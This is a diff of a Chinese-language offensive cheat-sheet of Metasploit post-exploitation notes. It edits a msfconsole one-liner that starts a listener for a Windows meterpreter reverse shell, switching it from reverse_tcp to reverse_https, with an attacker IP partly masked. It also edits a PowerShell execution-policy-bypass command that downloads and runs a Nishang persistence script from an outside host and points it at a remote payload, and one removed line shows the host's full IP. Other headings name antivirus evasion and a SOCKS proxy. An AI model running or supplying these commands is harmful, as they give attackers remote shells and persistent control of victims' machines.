@@ -2,7 +2,7 @@
 心得
 
 1、启动console
-msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 121.43.xx.xx;set lport 5555;exploit -j"
+msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set lhost 121.xx.xx.43;set lport 5555;exploit -j"
 
 
 2、过杀软
@@ -37,4 +37,4 @@ use auxiliary/server/socks4a
 
 
 10、持久化nishang
-powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://121.43.xx.xx:8888/Add-Persistence.ps1');Add-Persistence -PayloadURL http://121.43.163.43:8888/https5555.ps1"
+powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://121.43.xx.xx:8888/Add-Persistence.ps1');Add-Persistence -PayloadURL http://121.xx.xx.43:8888/https5555.ps1"
